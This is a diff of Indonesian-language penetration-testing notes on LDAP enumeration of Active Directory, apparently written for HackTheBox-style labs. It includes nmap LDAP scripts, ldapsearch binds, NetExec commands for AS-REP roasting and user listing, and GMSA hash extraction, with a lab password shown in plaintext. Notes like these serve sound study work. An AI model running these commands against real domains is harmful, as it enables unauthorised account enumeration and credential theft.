@@ -1,10 +1,14 @@
 adalah "phonebook" dari Active Directory. Semua object di domain — user, group, computer, GPO, SPN — tersimpan di sini. Kalau kita bisa query LDAP, kita bisa memetakan seluruh domain tanpa exploit apapun.
-# Ports
 
 | Port | Services |
 | ---- | -------- |
 | 389  | LDAP     |
 | 636  | LDAPS    |
+
+# Enum
+```shell
+sudo nmap -n -sV --script 'ldap* and not brute' 10.10.11.42 -o nmap_ldap.txt
+```
 
 Level 0 -> Windows 2000
 Level 2 -> Windows Server 2003
@@ -36,9 +40,9 @@ ldapsearch -H ldap://logging.htb -x -b 'DC=logging,DC=htb' -D 'wallace.everette@
 nxc ldap 10.129.245.130 -u 'wallace.everette' -p 'Welcome2026@' --asreproast asreproastable.txt
 ```
 
-# List User
+# User
 ```shell
-nxc ldap <IP> -u '<user>' -p '<pass>' -M get-desc-users
+nxc ldap <IP> -u '<user>' -p '<pass>' --users
 ```
 # List Computer
 ```shell
@@ -75,3 +79,4 @@ Akun GMSA biasanya ada `$` di akhirnya, seperti `MS01$` .
 karena kita menggunakan TGT, password bisa dikosongkan
 ![](Attachments/Pasted%20image%2020260618190850.png)
 output dari GMSA adalah NTLM hash
+
